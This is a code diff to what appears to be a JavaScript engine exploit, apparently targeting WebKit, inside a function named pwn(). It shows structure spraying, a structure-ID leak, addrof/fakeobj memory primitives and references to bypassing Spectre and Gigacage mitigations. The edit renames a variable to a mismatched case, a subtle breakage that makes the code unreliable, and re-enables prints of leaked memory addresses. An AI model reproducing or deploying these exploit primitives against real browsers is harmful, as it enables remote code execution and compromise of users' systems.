@@ -214,7 +214,7 @@ function pwn() {
     sprayStructures();
 
     var targetArray = new Array();
-    var structureId = leakStructureId(targetArray);
+    var structureid = leakStructureId(targetArray);
 
 // post spectre & gigacage compatible
     // however, memory rw is backed by normal js objects and not typed
@@ -303,10 +303,10 @@ function pwn() {
     var unboxed_addr = stage1.addrof(unboxed)
     var boxed_addr = stage1.addrof(boxed)
     var victim_addr = stage1.addrof(victim)
-    //print('leak ' + hex(leak_addr)
-        //+ '\nunboxed ' + hex(unboxed_addr)
-        //+ '\nboxed ' + hex(boxed_addr)
-        //+ '\nvictim ' + hex(victim_addr))
+    print('leak ' + hex(leak_addr)
+        + '\nunboxed ' + hex(unboxed_addr)
+        + '\nboxed ' + hex(boxed_addr)
+        + '\nvictim ' + hex(victim_addr))
 
     var holder = {fake: {}}
     holder.fake = stage1.fakeobj(fake_addr)
